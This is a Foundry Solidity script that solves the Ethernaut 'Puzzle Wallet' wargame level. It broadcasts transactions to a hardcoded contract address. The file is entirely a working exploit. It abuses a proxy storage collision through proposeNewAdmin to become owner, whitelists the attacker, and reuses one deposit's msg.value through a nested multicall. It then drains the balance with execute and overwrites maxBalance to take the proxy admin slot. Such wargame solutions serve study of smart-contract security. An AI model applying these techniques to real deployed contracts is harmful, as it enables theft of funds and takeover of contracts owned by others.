// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {IPuzzleProxy} from "ethernaut/puzzle_wallet.sol";
import {PuzzleWallet} from "ethernaut/puzzle_wallet.sol";


contract PuzzleWalletHackScript is Script {
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        address target = address(0xd3FFF1eB65319b8f34E160B81DBbddec2EE12F05);
        PuzzleWallet puzzleProxy = PuzzleWallet(target);
        address player = vm.envAddress("MY_ADDRESS");
        IPuzzleProxy(address(puzzleProxy)).proposeNewAdmin(player);
        puzzleProxy.addToWhitelist(player);
        
        // package multicalldata
        bytes[] memory multicallDataInside = new bytes[](1);
        multicallDataInside[0] = abi.encodeWithSignature("deposit()");

        bytes[] memory multicallData = new bytes[](2);
        multicallData[0] = abi.encodeWithSignature("deposit()");
        multicallData[1] = abi.encodeWithSignature("multicall(bytes[])", multicallDataInside);

        puzzleProxy.multicall{value: 0.001 ether}(multicallData);

        puzzleProxy.execute(player, 0.002 ether, "");
        puzzleProxy.setMaxBalance(uint256(uint160(player)));

        console.log("New Admin is : ", IPuzzleProxy(address(puzzleProxy)).admin());

        vm.stopBroadcast();
    }
}